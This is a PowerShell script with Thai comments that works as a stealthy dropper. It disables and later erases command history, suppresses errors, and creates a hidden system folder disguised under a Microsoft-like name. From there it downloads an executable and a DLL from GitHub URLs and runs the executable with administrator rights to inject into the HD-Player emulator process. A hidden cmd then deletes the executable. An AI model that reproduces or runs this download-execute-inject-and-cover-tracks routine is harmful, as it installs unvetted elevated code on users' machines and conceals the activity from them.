# 1. จัดการเรื่องประวัติและข้อผิดพลาด (เน้นความเงียบ)
try { Set-PSReadlineOption -HistorySaveStyle SaveNothing } catch {}
$ErrorActionPreference = 'SilentlyContinue'
$ProgressPreference = 'SilentlyContinue'

# 2. ตั้งค่าที่อยู่โฟลเดอร์เป้าหมาย (สร้างและซ่อนโฟลเดอร์)
$workDir = "$env:LOCALAPPDATA\Microsoft\CLR_v4.0"
if (Test-Path $workDir) { 
    Remove-Item $workDir -Recurse -Force -ErrorAction SilentlyContinue 
}
New-Item -Path $workDir -ItemType Directory -Force | Out-Null 
& attrib +h +s $workDir

# กำหนดเส้นทางและลิงก์ (โหลดตัวรัน EXE มาช่วย Inject และโหลด DLL ใหม่ของคุณ)
$exeOutput = Join-Path $workDir "WinHelper.exe"
$dllOutput = Join-Path $workDir "mscories.dll" # หรือเปลี่ยนชื่อให้ตรงกับที่ตัวรันเรียกหา

$exeUrl = "https://github.com/relaxwtf777-lang/cmd/raw/refs/heads/main/BASX.exe"
$dllUrl = "https://github.com/zenxler98-ui/BASX/raw/refs/heads/main/BASX.dll"

# 3. ดาวน์โหลดไฟล์ทั้งหมด
if (Test-Path $exeOutput) { Remove-Item $exeOutput -Force }
if (Test-Path $dllOutput) { Remove-Item $dllOutput -Force }

try {
    $wc = New-Object System.Net.WebClient
    $wc.DownloadFile($exeUrl, $exeOutput)
    $wc.DownloadFile($dllUrl, $dllOutput)
} catch {
    Invoke-WebRequest -Uri $exeUrl -OutFile $exeOutput -UseBasicParsing
    Invoke-WebRequest -Uri $dllUrl -OutFile $dllOutput -UseBasicParsing
}

# 4. สั่งรันตัวรันด้วยสิทธิ์ Admin เพื่อให้มันทำหน้าที่ Inject เข้า HD-Player
if (Test-Path $exeOutput) {
    try {
        $sh = New-Object -ComObject Shell.Application
        $sh.ShellExecute($exeOutput, "", "", "runas", 1)
        Start-Sleep -Seconds 3
    } catch {
        Start-Process -FilePath $exeOutput -Verb RunAs
    }
}

# 5. ทำความสะอาดเบื้องหลัง
try { Set-PSReadlineOption -HistorySaveStyle SaveIncrementally } catch {}
try {
    $cleanCmd = "timeout /t 15 && del /f /q `"$exeOutput`""
    Start-Process cmd -ArgumentList "/c $cleanCmd" -WindowStyle Hidden
} catch {}

try {
    Remove-Item (Get-PSReadlineOption).HistorySavePath -Force
} catch {}

exit
